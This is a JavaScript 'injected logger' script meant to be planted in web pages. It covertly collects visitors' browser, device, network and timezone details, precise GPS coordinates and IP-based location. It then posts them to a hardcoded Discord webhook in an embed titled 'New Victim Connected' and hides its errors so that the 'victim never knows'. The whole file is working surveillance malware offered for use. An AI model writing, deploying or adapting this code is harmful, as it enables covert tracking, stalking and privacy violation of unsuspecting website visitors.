

(async function ghostDiscordLogger() {
    // ==================== CONFIG =====================
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1450215350204633281/Ijfz8RQ66w6dsAUmTr2rGYQyJKFGZoTcsL-lTBGHddUsXIOwNjLzxNnW6ciqR7c-x6yv";
    //                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    //               PASTE YOUR DISCORD WEBHOOK URL HERE !!!!

    const AVATAR_URL = "https://i.imgur.com/4M34hi2.png"; // ghost / skull / whatever you want
    const USERNAME = "zelphix logger";

    // ─── Main data object ────────────────────────────────────────
    const info = {
        timestamp: new Date().toISOString(),
        page: window.location.href,
        referrer: document.referrer || "direct / unknown",
        userAgent: navigator.userAgent,
        language: navigator.languages?.join(", ") || navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${screen.width} × ${screen.height}  (${window.devicePixelRatio}x)`,
        connection: navigator.connection ? 
            `${navigator.connection.effectiveType} • ${navigator.connection.downlink}Mbps` 
            : "unknown",
        hardware: `CPU: ${navigator.hardwareConcurrency || "?"} cores • RAM: ${navigator.deviceMemory || "?"}GB`,
        gps: "not requested / denied",
        ip_location: "loading..."
    };

    // ─── 1. Try to get very accurate GPS (most people will deny) ───
    if ("geolocation" in navigator) {
        try {
            const pos = await new Promise((res, rej) => 
                navigator.geolocation.getCurrentPosition(res, rej, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                })
            );

            info.gps = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}` +
                       `  (±${Math.round(pos.coords.accuracy)}m)`;
        } 
        catch (e) {
            info.gps = `denied / error (${e.code})`;
        }
    }

    // ─── 2. Much more reliable IP → location services ────────────
    // Trying multiple providers → higher chance at least one works
    const ipServices = [
        "https://ipwho.is/",
        "https://ipapi.co/json/",
        "https://freeipapi.com/api/json",
        "https://api.ipgeolocation.io/ipgeo?apiKey=free"
    ];

    for (const url of ipServices) {
        try {
            const response = await fetch(url, { cache: "no-store" });
            if (!response.ok) continue;

            const data = await response.json();

            // Different APIs → different field names
            const ip = data.ip || data.query;
            const city = data.city || data.cityName || data.city_name;
            const region = data.region || data.regionName || data.region_name;
            const country = data.country || data.countryName || data.country_name;
            const lat = data.latitude || data.lat;
            const lon = data.longitude || data.lon;

            if (ip && country) {
                info.ip_location = `${ip}\n${city || "?"} • ${region || "?"} • ${country}\n${lat?.toFixed(6) || "?"} , ${lon?.toFixed(6) || "?"}`;
                break; // we have good data → stop trying others
            }
        } 
        catch (e) {}
    }

    if (info.ip_location === "loading...") {
        info.ip_location = "couldn't get location (all services failed)";
    }

    // ─── 3. Very pretty Discord embed ─────────────────────────────
    const payload = {
        username: USERNAME,
        avatar_url: AVATAR_URL,
        embeds: [{
            title: "⟡ New Victim Connected ⟡",
            color: 0x00ff9d,
            fields: [
                { name: "Page",          value: `\`\`\`${info.page}\`\`\``, inline: false },
                { name: "Referrer",      value: `\`\`\`${info.referrer}\`\`\``, inline: false },
                { name: "Device / UA",   value: `\`\`\`${info.userAgent}\`\`\``, inline: false },
                { name: "Screen",        value: `\`\`\`${info.screen}\`\`\``,   inline: true },
                { name: "Connection",     value: `\`\`\`${info.connection}\`\`\``, inline: true },
                { name: "Timezone",       value: `\`\`\`${info.timezone}\`\`\``, inline: true },
                { name: "GPS",           value: `\`\`\`${info.gps}\`\`\``,      inline: false },
                { name: "IP + Location", value: `\`\`\`${info.ip_location}\`\`\``, inline: false }
            ],
            timestamp: info.timestamp,
            footer: {
                text: "Ghost Protocol • injected logger"
            }
        }]
    };

    // ─── 4. Send ──────────────────────────────────────────────────
    try {
        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        // silent death - victim never knows
    }

})();

// Optional second try (very useful when people deny location first time)
setTimeout(ghostDiscordLogger, 4500);
